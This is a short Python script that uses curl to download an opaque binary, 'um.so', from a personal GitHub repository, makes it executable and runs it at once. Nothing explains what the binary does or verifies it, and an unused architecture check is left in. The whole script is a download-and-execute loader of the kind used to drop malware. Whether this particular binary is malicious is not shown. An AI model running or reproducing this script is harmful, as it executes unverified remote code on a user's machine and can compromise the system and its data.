import subprocess
import platform

um_so_url = "https://github.com/Saoud060/Approval/raw/main/um.so"

architecture = platform.machine()

subprocess.run(["curl", "-o", "um.so", um_so_url])

subprocess.run(["chmod", "+x", "um.so"])

try:
    subprocess.run([f"./um.so"])
except Exception as e:
    print(f"Error: {e}")
